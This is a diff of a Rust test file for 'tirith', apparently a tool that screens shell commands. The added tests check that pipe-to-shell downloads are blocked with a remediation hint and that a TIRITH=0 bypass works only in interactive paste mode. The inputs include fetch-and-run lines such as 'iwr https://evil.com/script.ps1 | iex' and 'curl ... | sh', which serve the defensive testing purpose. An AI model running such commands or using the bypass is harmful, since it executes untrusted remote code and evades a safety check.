@@ -41,6 +41,52 @@ fn check_curl_pipe_bash_blocks() {
 }
 
 #[test]
+fn check_curl_pipe_bash_shows_remediation_hint() {
+    let out = tirith()
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--",
+            "curl https://example.com/install.sh | bash",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("getvet.sh"),
+        "human output should contain vet hint: {stderr}"
+    );
+}
+
+#[test]
+fn check_iwr_pipe_iex_no_tirith_run_hint() {
+    let out = tirith()
+        .args([
+            "check",
+            "--shell",
+            "powershell",
+            "--non-interactive",
+            "--",
+            "iwr https://evil.com/script.ps1 | iex",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("getvet.sh"),
+        "PowerShell fetch should show vet hint: {stderr}"
+    );
+    assert!(
+        !stderr.contains("tirith run"),
+        "PowerShell fetch should NOT suggest tirith run: {stderr}"
+    );
+}
+
+#[test]
 fn check_http_to_sink_blocks() {
     let out = tirith()
         .args([
@@ -177,6 +223,78 @@ fn paste_ansi_escape_blocks() {
         out.status.code(),
         Some(1),
         "paste with ANSI escapes should block"
+    );
+}
+
+#[test]
+fn paste_inline_bypass_requires_interactive_mode() {
+    use std::io::Write;
+    let mut child = tirith()
+        .args(["paste", "--shell", "posix"])
+        .stdin(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith");
+
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(b"TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
+        .unwrap();
+
+    let out = child.wait_with_output().unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "non-interactive paste should not honor bypass by default"
+    );
+}
+
+#[test]
+fn paste_inline_bypass_honored_with_interactive_flag() {
+    use std::io::Write;
+    let mut child = tirith()
+        .args(["paste", "--shell", "posix", "--interactive"])
+        .stdin(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith");
+
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(b"TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
+        .unwrap();
+
+    let out = child.wait_with_output().unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "interactive paste should honor TIRITH=0 bypass"
+    );
+}
+
+#[test]
+fn paste_env_wrapper_bypass_honored_with_interactive_flag() {
+    use std::io::Write;
+    let mut child = tirith()
+        .args(["paste", "--shell", "posix", "--interactive"])
+        .stdin(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith");
+
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(b"env TIRITH=0 curl -LsSf https://example.com/install.sh | sh")
+        .unwrap();
+
+    let out = child.wait_with_output().unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "interactive paste should honor env TIRITH=0 bypass"
     );
 }
 
